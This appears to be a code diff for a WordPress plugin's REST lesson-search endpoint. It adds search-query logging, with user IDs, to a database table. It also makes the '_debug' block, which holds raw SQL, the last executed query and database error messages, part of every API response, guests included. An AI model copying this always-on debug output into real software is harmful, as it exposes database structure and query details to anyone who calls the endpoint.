+        // Build the actual SQL with values substituted for debugging
+        $debug_sql = isset($prepared) ? $prepared : '';
+        $debug_count_sql = isset($count_sql) ? $count_sql : '';
+        $debug_fuzzy_sql = '';
+        $debug_fuzzy_count_sql = '';
+        
+        // If fuzzy fallback was used, also show that SQL
+        if (!empty($q) && (empty($rows) || $total === 0) && isset($prepared2)) {
+            $debug_fuzzy_sql = $prepared2;
+            if (isset($count_sql2) && isset($count_params2)) {
+                $debug_fuzzy_count_sql = $this->wpdb->prepare($count_sql2, $count_params2);
+            }
+        }
+        
+        // Log search query (log all searches, even from guests)
+        // Only log queries with 2+ characters to avoid logging every keystroke
+        // Don't log HEAD requests (those are just for debounced logging)
+        $is_head_request = $request->get_method() === 'HEAD';
+        $should_log = !empty($q) && strlen($q) >= 2 && !$is_head_request;
+        
+        if ($should_log) {
+            // Get user ID - WPEngine strips cookies, so we rely on REST API nonce authentication
+            // WordPress REST API should have authenticated the user if nonce is valid
+            $user_id = 0;
             
-            // If fuzzy fallback was used, show that SQL instead
-            if (!empty($q) && (empty($rows) || $total === 0) && isset($prepared2)) {
-                $debug_sql = $prepared2;
-                if (isset($count_sql2) && isset($count_params2)) {
-                    $debug_count_sql = $this->wpdb->prepare($count_sql2, $count_params2);
-                }
+            // Try to get current user (WordPress REST API should set this if nonce is valid)
+            $current_user = wp_get_current_user();
+            if ($current_user && $current_user->ID > 0) {
+                $user_id = $current_user->ID;
             }
             
-            $response['_debug'] = array(
-                'sql' => $debug_sql,
-                'count_sql' => $debug_count_sql,
-                'filters' => array(
-                    'query' => $q,
-                    'lesson_style' => $lesson_style,
-                    'lesson_level' => $lesson_level,
-                    'tag' => $tag,
-                    'collection_id' => $collection_id,
-                    'membership_level' => $membership_param,
-                    'page' => $page,
-                    'per_page' => $per_page
-                ),
-                'total_results' => $total,
-                'returned_results' => count($items)
-            );
+            // Fallback: Try standard WordPress function
+            if (!$user_id && is_user_logged_in()) {
+                $user_id = get_current_user_id();
+            }
+            
+            // Note: If cookies are stripped by WPEngine, we may not be able to identify the user
+            // In that case, user_id will be 0 (guest), which is acceptable
+            
+            // Note: user_id can be 0 for guest users - we'll log it anyway
+            
+            $search_logs_table = $this->database->get_table_name('search_logs');
+            
+            // Ensure table exists before trying to insert
+            $table_exists = $this->wpdb->get_var("SHOW TABLES LIKE '{$search_logs_table}'") == $search_logs_table;
+            if (!$table_exists) {
+                // Try to create the table
+                $database = new ALM_Database();
+                $database->create_tables();
+                $table_exists = $this->wpdb->get_var("SHOW TABLES LIKE '{$search_logs_table}'") == $search_logs_table;
+            }
+            
+            if ($table_exists) {
+                $result = $this->wpdb->insert(
+                    $search_logs_table,
+                    array(
+                        'user_id' => $user_id, // Can be 0 for guests
+                        'search_query' => $q,
+                        'search_source' => $search_source,
+                        'results_count' => $total,
+                        'created_at' => current_time('mysql')
+                    ),
+                    array('%d', '%s', '%s', '%d', '%s')
+                );
+                
+                // Log error if insert failed (for debugging)
+                if ($result === false && !empty($this->wpdb->last_error)) {
+                    error_log('ALM Search Log: Failed to insert search log - ' . $this->wpdb->last_error);
+                }
+            }
         }
+        
+        // Always include debug info (not just when debug_mode is enabled)
+        $response['_debug'] = array(
+            'sql' => $debug_sql,
+            'count_sql' => $debug_count_sql,
+            'fuzzy_sql' => $debug_fuzzy_sql,
+            'fuzzy_count_sql' => $debug_fuzzy_count_sql,
+            'actual_executed_query' => !empty($q) && (empty($rows) || $total === 0) ? $this->wpdb->last_query : '',
+            'db_error' => $this->wpdb->last_error ?: '',
+            'filters' => array(
+                'query' => $q,
+                'lesson_style' => $lesson_style,
+                'lesson_level' => $lesson_level,
+                'tag' => $tag,
+                'collection_id' => $collection_id,
+                'membership_level' => $membership_param,
+                'page' => $page,
+                'per_page' => $per_page
+            ),
+            'total_results' => $total,
+            'returned_results' => count($items),
+            'used_fuzzy_fallback' => !empty($debug_fuzzy_sql),
+            'where_params_count' => count($where_params),
+            'select_params_count' => count($select_params)
+        );
 
         return new WP_REST_Response($response, 200);
     }
